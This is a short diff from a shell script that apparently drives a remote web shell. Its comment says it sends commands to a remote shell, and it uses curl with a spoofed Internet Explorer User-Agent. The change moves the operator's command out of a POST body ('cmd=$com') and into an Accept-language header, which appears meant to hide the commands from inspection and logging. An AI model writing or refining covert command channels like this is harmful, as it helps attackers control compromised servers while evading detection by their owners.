@@ -38,7 +38,7 @@ read com
 			;;
 		#default send command to remote shell	
 		*)
-			curl -X POST -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko" -d"cmd=$com" $domain
+			curl -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko" -H "Accept-language: $com" $domain
 			;;
 
 	esac
